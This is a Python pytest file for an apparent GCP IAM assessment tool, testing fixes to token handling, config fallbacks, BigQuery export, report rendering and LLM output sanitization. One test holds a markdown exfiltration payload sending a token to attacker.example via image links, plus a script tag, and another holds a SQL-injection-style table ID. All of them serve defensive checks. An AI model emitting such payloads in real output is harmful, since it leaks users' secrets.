"""T17 — Comprehensive offline tests for all 8 LOW remediation items (L1-L4, L7-L10)."""

from __future__ import annotations

import inspect
import re
import time
from pathlib import Path
from typing import Any, Dict, List

import httpx
import pytest
from fastapi.testclient import TestClient
from PIL import Image as PILImage

import backend.config as config_mod
import backend.identity_guard as guard_mod
import backend.main as main_mod
import backend.report_generator as report_mod
import backend.session_vault as vault_mod
import backend.tools.cai_collector as cai_mod
import backend.tools.graph_engine as graph_mod
import backend.tools.onboarding_manager as onboarding_mod
import frontend.app as streamlit_app
from backend.models.findings import (
    GcpIamPostureFinding,
    IdentityTriadCategory,
    RiskSeverity,
    ServiceAccountKeyRecord,
)


REPO_ROOT = Path(__file__).resolve().parent.parent


# ==============================================================================
# T17 #1 — Dead code removal (existing_sid, dead SA refresh, gemini-4, last_authenticated_time)
# ==============================================================================


def test_t17_1_dead_code_removed(monkeypatch: pytest.MonkeyPatch) -> None:
    # 1a. verify_google_token & verify_google_token_cached no longer take dead existing_session_id
    assert "existing_session_id" not in inspect.signature(guard_mod.verify_google_token).parameters
    assert "existing_session_id" not in inspect.signature(guard_mod.verify_google_token_cached).parameters
    assert "existing_sid" not in (REPO_ROOT / "backend" / "main.py").read_text(encoding="utf-8")

    # 1b. SA token renewal does NOT retry expired base_user_access_token when persistent delegation is False
    mint_called = False

    def _fail_mint(*args: Any, **kwargs: Any) -> Any:
        nonlocal mint_called
        mint_called = True
        raise AssertionError("Dead base_user_access_token SA refresh must not be called")

    monkeypatch.setattr(vault_mod, "mint_impersonated_sa_token", _fail_mint)
    monkeypatch.setattr(vault_mod, "mint_delegated_sa_token_via_runtime_sa", _fail_mint)

    expired_sa_sess = vault_mod.InspectionSession(
        session_id="t17-sa-expired",
        owner_email="auditor@example.com",
        connection_mode="impersonated_sa",
        base_user_access_token="expired-user-tok",
        impersonated_sa_email="sa-iam-assessor@seed-proj.iam.gserviceaccount.com",
        effective_access_token="expired-sa-tok",
        token_expires_at=time.time() - 10.0,
        persistent_sa_delegation=False,
    )
    assert vault_mod._try_renew_session_token(expired_sa_sess, force=True) is False
    assert mint_called is False

    # 1c. No gemini-4 branch remains anywhere in backend or frontend
    for subdir in ("backend", "frontend"):
        for pyfile in (REPO_ROOT / subdir).rglob("*.py"):
            assert "gemini-4" not in pyfile.read_text(encoding="utf-8"), f"Found gemini-4 in {pyfile}"

    # 1d. ServiceAccountKeyRecord no longer defines unused last_authenticated_time
    assert "last_authenticated_time" not in ServiceAccountKeyRecord.model_fields


# ==============================================================================
# T17 #2 — Discovery readiness probe measures real latency & HTTP status
# ==============================================================================


def test_t17_2_discovery_probe_reports_real_http_status_and_latency(
    fake_session,
    fake_gcp,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Simulate CAI returning HTTP 503 and CRM fallback returning HTTP 500 with measurable elapsed time
    def _slow_error(method: str, url: str, params: Any, json_body: Any):
        time.sleep(0.015)
        return (503, {"error": {"message": "CAI temporarily unavailable"}})

    fake_gcp.add("GET", re.compile(r"organizations:search"), status=200, data={"organizations": [{"name": "organizations/123456789012", "displayName": "acme.example", "state": "ACTIVE"}]})
    fake_gcp.add("GET", re.compile(r"v3/organizations/123456789012$"), status=200, data={"displayName": "acme.example", "state": "ACTIVE"})
    fake_gcp.add("GET", re.compile(r"searchAllResources"), handler=_slow_error)
    fake_gcp.add("GET", re.compile(r"projects:search"), status=500, data={"error": {"message": "CRM backend error"}})
    fake_gcp.add("GET", re.compile(r"searchAllIamPolicies"), status=200, data={"results": []})
    fake_gcp.add("POST", re.compile(r"getEffectiveOrgPolicy"), status=200, data={"booleanPolicy": {"enforced": True}})

    res = onboarding_mod.verify_customer_onboarding_readiness(organization_id="123456789012")
    proj_check = next(c for c in res["checks"] if c["check_id"] == "PROJECT_DISCOVERY")

    assert proj_check["status"] == "FAIL"
    # Must report real HTTP 500 from CRM fallback, NOT hardcoded 403
    assert proj_check["http_status"] == 500
    # Must report real measured latency (>= 10 ms), NOT hardcoded 95
    assert proj_check["latency_ms"] != 95
    assert proj_check["latency_ms"] >= 10
    assert "CRM backend error" in proj_check["detail"]


# ==============================================================================
# T17 #3 — Remove host env var fallbacks in web paths
# ==============================================================================


def test_t17_3_no_host_env_fallbacks_in_web_paths(monkeypatch: pytest.MonkeyPatch) -> None:
    # Even when host env vars are populated, disconnected / web paths must NOT inherit them
    monkeypatch.setattr(config_mod.settings, "organization_id", "999999999999")
    monkeypatch.setattr(config_mod.settings, "organization_domain", "host-corp.example")
    monkeypatch.delenv("PERSISTENT_DELEGATION_SA", raising=False)
    monkeypatch.delenv("GOOGLE_CLOUD_PROJECT", raising=False)

    # No hardcoded default project ID
    assert vault_mod.configured_delegation_sa_email() == ""
    fresh_cfg = config_mod.AcceleratorConfig()
    assert fresh_cfg.project_id == ""

    # Disconnected context returns empty org/domains and refuses shared host export_dir
    with vault_mod.bind_inspection_session_context(None):
        assert cai_mod.active_organization_id() == ""
        assert cai_mod.active_organization_domain() == ""
        assert cai_mod.active_organization_domains() == set()
        with pytest.raises(PermissionError, match="shared host export directory"):
            cai_mod.active_export_dir()

    # Connected web session with blank org/domain still does NOT inherit host settings
    web_sess = vault_mod.InspectionSession(
        session_id="t17-web-blank",
        owner_email="user@acme.example",
        connection_mode="direct_user",
        base_user_access_token="tok",
        impersonated_sa_email="",
        effective_access_token="tok",
        token_expires_at=time.time() + 1800.0,
        organization_id="",
        organization_domain="",
    )
    with vault_mod.bind_inspection_session_context(web_sess):
        assert cai_mod.active_organization_id() == ""
        assert cai_mod.active_organization_domain() == ""
        assert cai_mod.active_organization_domains() == set()
        assert cai_mod.active_export_dir() == web_sess.session_export_dir


# ==============================================================================
# T17 #4 — BigQuery export validates table ID, uses deterministic insertId, surfaces status in UI
# ==============================================================================


def test_t17_4_bigquery_export_validation_insertid_and_ui_status(
    fake_session,
    fake_gcp,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    finding = GcpIamPostureFinding(
        finding_id="F-T17-01",
        scope="organizations/123456789012",
        project_id="demo-proj-1",
        triad_category=IdentityTriadCategory.INTERNAL,
        severity=RiskSeverity.HIGH,
        title="Standing Owner Binding",
        principal="user:admin@example.com",
        role="roles/owner",
        resource="//cloudresourcemanager.googleapis.com/projects/demo-proj-1",
        risk_vector="Standing Primitive Admin",
        evidence_summary="Observed standing roles/owner binding",
        recommended_modernization="Migrate to PAM JIT",
    )

    # 1. Invalid customer BigQuery table rejected before any HTTP call
    fake_session.optional_customer_bq_table = "bad-proj;DROP TABLE.ds.tbl"
    invalid_res = cai_mod.persist_findings_list_to_bigquery([finding], scope="organizations/123456789012")
    assert invalid_res["status"] == "INVALID_CUSTOMER_BQ_TABLE"
    assert len(fake_gcp.calls) == 0

    # 2. Valid customer BigQuery table sends deterministic insertId across repeated exports
    fake_session.optional_customer_bq_table = "cust-sec-proj.iam_lake.posture_findings"
    captured_bodies: List[Dict[str, Any]] = []

    def _capture_bq(method: str, url: str, params: Any, json_body: Any):
        captured_bodies.append(json_body or {})
        return (200, {})

    fake_gcp.add("POST", re.compile(r"bigquery\.googleapis\.com/.*/insertAll$"), handler=_capture_bq)

    res1 = cai_mod.persist_findings_list_to_bigquery([finding], scope="organizations/123456789012")
    res2 = cai_mod.persist_findings_list_to_bigquery([finding], scope="organizations/123456789012")

    assert res1["status"] == "EXPORTED_TO_CUSTOMER_BIGQUERY"
    assert res1["rows_inserted"] == 1
    assert len(captured_bodies) == 2
    id1 = captured_bodies[0]["rows"][0]["insertId"]
    id2 = captured_bodies[1]["rows"][0]["insertId"]
    assert isinstance(id1, str) and len(id1) == 32
    assert id1 == id2  # Deterministic deduplication key

    # 3. Session metadata & UI HTML surface BigQuery export status visibly
    fake_session.last_bq_export_status = {k: v for k, v in res1.items() if k != "session_jsonl_path"}
    meta = fake_session.to_public_metadata()
    assert meta["bigquery_export_status"]["status"] == "EXPORTED_TO_CUSTOMER_BIGQUERY"
    assert "session_jsonl_path" not in meta["bigquery_export_status"]

    client = TestClient(main_mod.app)
    html = client.get("/").text
    assert 'id="bqExportStatusBadge"' in html
    assert 'id="bqTelemetryStatus"' in html
    assert "updateBigQueryStatusUI" in html


# ==============================================================================
# T17 #5 — Streamlit renders LLM output without loading remote images
# ==============================================================================


def test_t17_5_streamlit_sanitizes_llm_remote_images_and_html() -> None:
    malicious_llm = (
        "## Summary\n"
        "Normal **finding** text.\n"
        "![exfil](https://attacker.example/leak?secret=ya29.abc)\n"
        "![ref-exfil][img1]\n"
        '<img src="https://attacker.example/pixel.gif" />\n'
        '<script>alert(1)</script>\n'
    )
    safe = streamlit_app.sanitize_llm_markdown_for_streamlit(malicious_llm)
    assert "https://attacker.example" not in safe
    assert "![" not in safe
    assert "<img" not in safe.lower()
    assert "<script" not in safe.lower()
    assert "Normal **finding** text." in safe

    # Verify frontend/app.py routes LLM markdown through sanitizer with unsafe_allow_html=False
    src = (REPO_ROOT / "frontend" / "app.py").read_text(encoding="utf-8")
    assert "sanitize_llm_markdown_for_streamlit(book.executive_narrative_markdown)" in src
    assert 'sanitize_llm_markdown_for_streamlit(chat_res["response"])' in src


# ==============================================================================
# T17 #6 — PDF preserves PNG aspect ratio; Graph disables mathtext on labels
# ==============================================================================


def test_t17_6_pdf_preserves_png_aspect_ratio_and_graph_disables_mathtext(
    tmp_path: Path,
    fake_session,
) -> None:
    # 1. Wide 1600x400 PNG (aspect ratio 4:1) keeps exact 4:1 ratio inside PDF Flowable
    png_path = tmp_path / "wide_banner.png"
    PILImage.new("RGB", (1600, 400), color=(20, 40, 80)).save(png_path)
    img_flowable = report_mod._scaled_pdf_image(png_path, max_w=400.0, max_h=300.0)
    assert img_flowable.drawWidth == pytest.approx(400.0, rel=1e-3)
    assert img_flowable.drawHeight == pytest.approx(100.0, rel=1e-3)

    # 2. Tall 300x1200 PNG (aspect ratio 1:4) clamps by max_h and keeps exact 1:4 ratio
    tall_path = tmp_path / "tall_diagram.png"
    PILImage.new("RGB", (300, 1200), color=(80, 20, 40)).save(tall_path)
    tall_flowable = report_mod._scaled_pdf_image(tall_path, max_w=400.0, max_h=200.0)
    assert tall_flowable.drawHeight == pytest.approx(200.0, rel=1e-3)
    assert tall_flowable.drawWidth == pytest.approx(50.0, rel=1e-3)

    # 3. Graph labels containing `$` (which would otherwise trigger Matplotlib mathtext parser errors)
    from backend.models.findings import AttackPathEdge, AttackPathGraphSummary, AttackPathNode

    summary = AttackPathGraphSummary(
        scope="organizations/123456789012",
        total_nodes=2,
        total_edges=1,
        escalation_paths_count=1,
        toxic_combinations_count=0,
        max_chain_depth=1,
        nodes=[
            AttackPathNode(
                node_id="user:ops$alpha$1@example.com",
                node_type="user",
                label="ops$alpha$1@example.com",
                project_id="proj-a",
                betweenness_centrality=0.5,
                degree_centrality=1.0,
            ),
            AttackPathNode(
                node_id="sa:svc$billing$prod@proj-a.iam.gserviceaccount.com",
                node_type="service_account",
                label="svc$billing$prod",
                project_id="proj-a",
                betweenness_centrality=0.5,
                degree_centrality=1.0,
            ),
        ],
        edges=[
            AttackPathEdge(
                source="user:ops$alpha$1@example.com",
                target="sa:svc$billing$prod@proj-a.iam.gserviceaccount.com",
                relationship="CAN_IMPERSONATE",
                permission_vector="roles/iam.serviceAccountTokenCreator",
                is_escalation_edge=True,
            )
        ],
    )
    out_png = tmp_path / "dollar_graph.png"
    rendered = graph_mod.render_attack_graph_png(
        scope="organizations/123456789012",
        output_path=out_png,
        graph_summary=summary,
    )
    assert rendered.exists() and rendered.stat().st_size > 1000


# ==============================================================================
# T17 #7 — direct_user mode uses real tokeninfo expiration instead of fixed 1h
# ==============================================================================


def test_t17_7_direct_user_uses_real_tokeninfo_expiry(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(vault_mod, "_SESSION_ROOT_DIR", tmp_path / "sessions")

    def _mock_post_short(url: str, data: Dict[str, Any] | None = None, timeout: float = 6.0, **kwargs: Any):
        assert url == vault_mod.GOOGLE_TOKENINFO_URL
        assert data == {"access_token": "ya29.short-lived"}
        return httpx.Response(200, json={"expires_in": "420", "email": "alice@example.com"})

    monkeypatch.setattr(vault_mod.httpx, "post", _mock_post_short)

    before = time.time()
    sess = vault_mod.store_inspection_session(
        session_id="t17-direct-short",
        owner_email="alice@example.com",
        user_access_token="ya29.short-lived",
        connection_mode="direct_user",
        organization_id="123456789012",
    )
    try:
        remaining = sess.token_expires_at - before
        assert 400.0 <= remaining <= 440.0  # Real ~420s TTL, NOT hardcoded 3600s
    finally:
        vault_mod.wipe_inspection_session("t17-direct-short", "alice@example.com", wipe_persistent=True)

    # Expired token from tokeninfo must be rejected with PermissionError
    def _mock_post_expired(url: str, **kwargs: Any):
        return httpx.Response(400, json={"error_description": "Invalid Value"})

    monkeypatch.setattr(vault_mod.httpx, "post", _mock_post_expired)
    with pytest.raises(PermissionError, match="invalid or expired"):
        vault_mod.store_inspection_session(
            session_id="t17-direct-expired",
            owner_email="alice@example.com",
            user_access_token="ya29.expired",
            connection_mode="direct_user",
            organization_id="123456789012",
        )


# ==============================================================================
# T17 #8 — set_active_model does not mutate global process state
# ==============================================================================


def test_t17_8_set_active_model_does_not_mutate_global_state(monkeypatch: pytest.MonkeyPatch) -> None:
    cfg = config_mod.AcceleratorConfig()
    original_model = cfg.gemini_model
    monkeypatch.setenv("GEMINI_MODEL", "sentinel-env-value")

    resolved = cfg.set_active_model("gemini-3.1-pro")
    assert resolved == config_mod.DEFAULT_VERTEX_MODEL
    assert cfg.gemini_model == original_model
    assert config_mod.os.environ["GEMINI_MODEL"] == "sentinel-env-value"

    with pytest.raises(ValueError, match="Unsupported Vertex AI model"):
        cfg.set_active_model("gemini-invalid-model")
